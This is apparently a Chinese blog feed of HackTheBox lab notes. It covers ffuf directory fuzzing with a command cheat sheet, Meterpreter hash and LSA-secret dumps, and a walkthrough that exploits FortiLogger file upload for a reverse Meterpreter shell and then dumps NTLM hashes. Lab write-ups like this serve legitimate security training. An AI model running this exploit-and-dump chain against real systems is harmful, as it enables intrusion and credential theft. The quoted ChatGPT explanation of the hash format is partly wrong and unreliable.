\__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://165.232.46.252:32335/forum/FUZZ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Extensions       : .php  :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 60 :: Matcher          : Response status: 200,204,301,302,307,401,403,405________________________________________________[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# This work is licensed under the Creative Commons    * FUZZ: # This work is licensed under the Creative Commons[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/#.php    * FUZZ: #.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# directory-list-2.3-small.txt    * FUZZ: # directory-list-2.3-small.txt[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/#.php    * FUZZ: #.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/#    * FUZZ: #[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# Attribution-Share Alike 3.0 License. To view a copy of this    * FUZZ: # Attribution-Share Alike 3.0 License. To view a copy of this[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# Priority-ordered case-sensitive list, where entries were found    * FUZZ: # Priority-ordered case-sensitive list, where entries were found[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/    * FUZZ: [Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# on at least 3 different hosts    * FUZZ: # on at least 3 different hosts[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# This work is licensed under the Creative Commons.php    * FUZZ: # This work is licensed under the Creative Commons.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# on at least 3 different hosts.php    * FUZZ: # on at least 3 different hosts.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# Suite 300, San Francisco, California, 94105, USA..php    * FUZZ: # Suite 300, San Francisco, California, 94105, USA..php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# Suite 300, San Francisco, California, 94105, USA.    * FUZZ: # Suite 300, San Francisco, California, 94105, USA.[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/#    * FUZZ: #[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# Copyright 2007 James Fisher    * FUZZ: # Copyright 2007 James Fisher[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php    * FUZZ: # license, visit http://creativecommons.org/licenses/by-sa/3.0/.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/index.php    * FUZZ: index.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# directory-list-2.3-small.txt.php    * FUZZ: # directory-list-2.3-small.txt.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# Priority-ordered case-sensitive list, where entries were found.php    * FUZZ: # Priority-ordered case-sensitive list, where entries were found.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# Copyright 2007 James Fisher.php    * FUZZ: # Copyright 2007 James Fisher.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# or send a letter to Creative Commons, 171 Second Street,.php    * FUZZ: # or send a letter to Creative Commons, 171 Second Street,.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/#.php    * FUZZ: #.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# license, visit http://creativecommons.org/licenses/by-sa/3.0/    * FUZZ: # license, visit http://creativecommons.org/licenses/by-sa/3.0/[Status: 403, Size: 282, Words: 20, Lines: 10]| URL | http://165.232.46.252:32335/forum/.php    * FUZZ: .php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# or send a letter to Creative Commons, 171 Second Street,    * FUZZ: # or send a letter to Creative Commons, 171 Second Street,[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/#    * FUZZ: #[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/#    * FUZZ: #[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/# Attribution-Share Alike 3.0 License. To view a copy of this.php    * FUZZ: # Attribution-Share Alike 3.0 License. To view a copy of this.php[Status: 200, Size: 0, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/#.php    * FUZZ: #.php[Status: 200, Size: 21, Words: 1, Lines: 1]| URL | http://165.232.46.252:32335/forum/flag.php    * FUZZ: flag.php</code></pre><p>很明显，就在这个flag里面了</p><p>至此，basic fuzz先告一段落.</p><h3 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h3><h4 id="Ffuf-1"><a href="#Ffuf-1" class="headerlink" title="Ffuf"></a>Ffuf</h4><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>ffuf -h</code></td><td>ffuf help</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></td><td>Directory Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code></td><td>Extension Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></td><td>Page Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></td><td>Recursive Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code></td><td>Sub-domain Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H &#39;Host: FUZZ.academy.htb&#39; -fs xxx</code></td><td>VHost Fuzzing</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code></td><td>Parameter Fuzzing - GET</td></tr><tr><td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></td><td>Parameter Fuzzing - POST</td></tr><tr><td><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></td><td>Value Fuzzing</td></tr></tbody></table><hr><h4 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h4><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td><td>Directory&#x2F;Page Wordlist</td></tr><tr><td><code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code></td><td>Extensions Wordlist</td></tr><tr><td><code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code></td><td>Domain Wordlist</td></tr><tr><td><code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code></td><td>Parameters Wordlist</td></tr></tbody></table><hr><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>sudo sh -c &#39;echo &quot;SERVER_IP academy.htb&quot; &gt;&gt; /etc/hosts&#39;</code></td><td>Add DNS entry</td></tr><tr><td><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code></td><td>Create Sequence Wordlist</td></tr><tr><td><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39;</code></td><td>curl w&#x2F; POST</td></tr></tbody></table><p>[^注意]: </p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> tool </tag>
            
            <tag> hackthebox </tag>
            
            <tag> ffuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF_LEARN_1</title>
      <link href="/2023/06/13/MSF-LEARN/"/>
      <url>/2023/06/13/MSF-LEARN/</url>
      
        <content type="html"><![CDATA[<h4 id="MSF-转储哈希"><a href="#MSF-转储哈希" class="headerlink" title="MSF - 转储哈希"></a>MSF - 转储哈希</h4><p>  MSF - 转储哈希</p><pre><code>meterpreter &gt; hashdumpAdministrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::meterpreter &gt; lsa_dump_sam[+] Running as SYSTEM[*] Dumping SAMDomain : GRANNYSysKey : 11b5033b62a3d2d6bb80a0d45ea88bfbLocal SID : S-1-5-21-1709780765-3897210020-3926566182SAMKey : 37ceb48682ea1b0197c7ab294ec405feRID  : 000001f4 (500)User : Administrator  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf  Hash NTLM: d6908f022af0373e9e21b8a241c86dcaRID  : 000001f5 (501)User : GuestRID  : 000003e9 (1001)User : SUPPORT_388945a0  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6RID  : 000003eb (1003)User : IUSR_GRANPA  Hash LM  : a274b4532c9ca5cdf684351fab962e86  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88RID  : 000003ec (1004)User : IWAM_GRANPA  Hash LM  : 95d112c4da2348b599183ac6b1d67840  Hash NTLM: a97f39734c21b3f6155ded7821d04d16RID  : 000003ef (1007)User : ASPNET  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b  Hash NTLM: edc0d5506804653f58964a2376bbd769RID  : 000003f1 (1009)User : Lakis  Hash LM  : f927b0679b3cc0e192410d9b0b40873c  Hash NTLM: 3064b6fc432033870c6730228af7867c</code></pre><span id="more"></span><h4 id="MSF-Meterpreter-LSA-Secrets-Dump"><a href="#MSF-Meterpreter-LSA-Secrets-Dump" class="headerlink" title="MSF - Meterpreter LSA Secrets Dump"></a>MSF - Meterpreter LSA Secrets Dump</h4><p>  MSF - Meterpreter LSA Secrets Dump</p><pre><code>meterpreter &gt; lsa_dump_secrets[+] Running as SYSTEM[*] Dumping LSA secretsDomain : GRANNYSysKey : 11b5033b62a3d2d6bb80a0d45ea88bfbLocal name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )Domain name : HTBPolicy subsystem is : 1.7LSA Key : ada60ee248094ce782807afae1711b2cSecret  : aspnet_WP_PASSWORDcur/text: Q5C&#39;181g16D&#39;=FSecret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRVcur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 Secret  : DPAPI_SYSTEMcur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63     full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588cur/hex : 00 f2 d1 31 e2 11 d3 01 Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080dSecret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080dSecret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080dSecret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080dSecret  : L$&#123;6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A&#125;cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 Secret  : NL$KMcur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f Secret  : SACSecret  : SAISecret  : SCM:&#123;148f1a14-53f3-4074-a573-e1ccd344e1d0&#125;Secret  : SCM:&#123;3D14228D-FBE1-11D0-995D-00C04FD919C1&#125;Secret  : _SC_Alerter / service &#39;Alerter&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_ALG / service &#39;ALG&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_aspnet_state / service &#39;aspnet_state&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_Dhcp / service &#39;Dhcp&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_Dnscache / service &#39;Dnscache&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_LicenseService / service &#39;LicenseService&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_LmHosts / service &#39;LmHosts&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_MSDTC / service &#39;MSDTC&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_RpcLocator / service &#39;RpcLocator&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_RpcSs / service &#39;RpcSs&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_stisvc / service &#39;stisvc&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_TlntSvr / service &#39;TlntSvr&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_WebClient / service &#39;WebClient&#39; with username : NT AUTHORITY\LocalService</code></pre><p>暂时不知道怎么使用，但是先记录一下以备后续查找</p><h4 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h4><p>来自hackthebox：<a href="https://academy.hackthebox.com/module/39/section/414">USING THE METASPLOIT FRAMEWORK</a></p><p>目标主机： 10.129.203.65</p><p>渗透目标：</p><ul><li>在 MSF 中查找现有漏洞，并使用它来获取目标上的外壳。您获得外壳的用户的用户名是什么？</li><li>检索“htb-student”用户的 NTLM 密码哈希。提交哈希作为答案。</li></ul><h5 id="先扫描一下："><a href="#先扫描一下：" class="headerlink" title="先扫描一下："></a>先扫描一下：</h5><pre><code># nmap -sV -sC 10.129.203.65Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-13 16:29 CSTNmap scan report for 10.129.203.65Host is up (0.30s latency).Not shown: 995 closed portsPORT     STATE SERVICE       VERSION135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp  open  microsoft-ds?3389/tcp open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: |   Target_Name: WIN-51BJ97BCIPV|   NetBIOS_Domain_Name: WIN-51BJ97BCIPV|   NetBIOS_Computer_Name: WIN-51BJ97BCIPV|   DNS_Domain_Name: WIN-51BJ97BCIPV|   DNS_Computer_Name: WIN-51BJ97BCIPV|   Product_Version: 10.0.17763|_  System_Time: 2023-06-13T08:30:06+00:00| ssl-cert: Subject: commonName=WIN-51BJ97BCIPV| Not valid before: 2023-06-12T08:17:05|_Not valid after:  2023-12-12T08:17:05|_ssl-date: 2023-06-13T08:30:15+00:00; 0s from scanner time.5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: FortiLogger | Log and Report SystemService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2023-06-13T08:30:07|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds</code></pre><p>发现5000端口的IIS服务有潜在风险，搜索一下发先Microsoft-IIS&#x2F;10.0存在一个<a href="https://blog.csdn.net/Amdy_amdy/article/details/108864220">短文件漏洞</a> </p><p>msf 搜索一下，确实可以使用但是没办法返回一个shell，所以找找其他的漏洞。</p><p>我们尝试访问一下这个5000端口，但是身份验证失败，说明确实有一个网页，从扫描结果来看网站名为<code>FortiLogger</code> 一般而言这应该是网页搭建的框架之类的东西，查找一下：</p><h5 id="什么是-FortiLogger？"><a href="#什么是-FortiLogger？" class="headerlink" title="什么是 FortiLogger？"></a>什么是 FortiLogger？</h5><p>FortiLogger 是一款基于 Web 的日志记录和报告软件，运行在专为 FortiGate 防火墙准备的 Windows 操作系统上。它具有即时状态监控，日志记录，搜索&#x2F;过滤，报告和热点等功能。</p><p>再到漏洞库里搜索一下有没有相关漏洞，发现刚好有一个：</p><pre><code>0 exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit</code></pre><p>无法确定具体版本，但是先try一try：</p><pre><code>[*] Started reverse TCP handler on 10.10.15.22:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[+] The target is vulnerable. FortiLogger version 4.4.2.2[+] Generate Payload[+] Payload has been uploaded[*] Executing payload...[*] Sending stage (175686 bytes) to 10.129.203.65[*] Meterpreter session 1 opened (10.10.15.22:4444 -&gt; 10.129.203.65:49707) at 2023-06-13 17:31:54 +0800meterpreter &gt; </code></pre><p>成功了!打开shell：</p><pre><code>C:\Windows\system32&gt;whoamiwhoamint authority\system</code></pre><p>得到第一题答案，执行hashdump：</p><pre><code>hashdump&#39;hashdump&#39; is not recognized as an internal or external command,operable program or batch file.</code></pre><p>发现不行</p><h5 id="local-exploit-suggester"><a href="#local-exploit-suggester" class="headerlink" title="local_exploit_suggester"></a>local_exploit_suggester</h5><p>再引导文件中有这一段：</p><pre><code>我们可以很容易地决定运行local exploit suggester模块，将其附加到当前活动的Meterpeter会话。要做到这一点，我们对当前的Metereter会话进行后台处理，搜索我们需要的模块，并将session选项设置为Metermeter会话的索引号，将模块绑定到它。</code></pre><p>将这个模块绑定到会话上来，执行后：</p><pre><code> #   Name                                                           Potentially Vulnerable?  Check Result -   ----                                                           -----------------------  ------------ 1   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable. 2   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable. 3   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated. 4   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.</code></pre><p>发现了新的可用漏洞，但是使用了两个模块都没有提权成功，乌鱼子。（其实此时我发现在meterpreter 上可以直接hashdump）</p><p>直接hashdump得到：</p><pre><code>htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::</code></pre><p>这里解释一下这段hash（chatgpt）：</p><pre><code>这段字符串 &quot;htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::&quot; 是使用 NTLM（NT LAN Manager）算法生成的密码哈希。让我解释一下每个部分的含义：1. &quot;htb-student&quot; 是账户名，表示用户名为 &quot;htb-student&quot;。2. &quot;1002&quot; 是用户的 RID（Relative Identifier），在 Windows 操作系统中用于标识用户的相对标识符。3. &quot;aad3b435b51404eeaad3b435b51404ee&quot; 是用户密码的 LM（LAN Manager）哈希值。LM哈希是一种弱密码哈希算法，已经被认为是不安全的，现代的 Windows 系统不再使用它来存储密码。4. &quot;cf3a5525ee9414229e66279623ed5c58&quot; 是用户密码的 NTLM 哈希值。NTLM哈希是一种更安全的密码哈希算法，用于存储密码的散列值。5. 最后两个冒号 &quot;::&quot; 表示空的 LM 哈希值和 NTLM 哈希值。在现代的 Windows 系统中，LM 哈希值通常为空，只使用 NTLM 哈希值进行密码验证。总结起来，这个字符串表示用户名为 &quot;htb-student&quot;，用户的密码经过 LM 哈希和 NTLM 哈希算法处理后的散列值分别为 &quot;aad3b435b51404eeaad3b435b51404ee&quot; 和 &quot;cf3a5525ee9414229e66279623ed5c58&quot;。在 HackTheBox 实验中，你只需要提交密码的 NTLM 哈希值 &quot;cf3a5525ee9414229e66279623ed5c58&quot; 作为答案，用于验证密码是否正确。</code></pre><p>因此，我们提交后半段即可；</p><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>lsa_dump_secrets：</p><p>这是演示文档的内容</p><h5 id="MSF-Meterpreter-LSA-Secrets-Dump-1"><a href="#MSF-Meterpreter-LSA-Secrets-Dump-1" class="headerlink" title="MSF - Meterpreter LSA Secrets Dump"></a>MSF - Meterpreter LSA Secrets Dump</h5><p>  MSF - Meterpreter LSA Secrets Dump</p><pre><code>meterpreter &gt; lsa_dump_secrets[+] Running as SYSTEM[*] Dumping LSA secretsDomain : GRANNYSysKey : 11b5033b62a3d2d6bb80a0d45ea88bfbLocal name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )Domain name : HTBPolicy subsystem is : 1.7LSA Key : ada60ee248094ce782807afae1711b2cSecret  : aspnet_WP_PASSWORDcur/text: Q5C&#39;181g16D&#39;=FSecret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRVcur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 Secret  : DPAPI_SYSTEMcur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63     full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588cur/hex : 00 f2 d1 31 e2 11 d3 01 Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080dSecret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080dSecret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080dSecret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080dSecret  : L$&#123;6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A&#125;cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 Secret  : NL$KMcur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f Secret  : SACSecret  : SAISecret  : SCM:&#123;148f1a14-53f3-4074-a573-e1ccd344e1d0&#125;Secret  : SCM:&#123;3D14228D-FBE1-11D0-995D-00C04FD919C1&#125;Secret  : _SC_Alerter / service &#39;Alerter&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_ALG / service &#39;ALG&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_aspnet_state / service &#39;aspnet_state&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_Dhcp / service &#39;Dhcp&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_Dnscache / service &#39;Dnscache&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_LicenseService / service &#39;LicenseService&#39; with username : 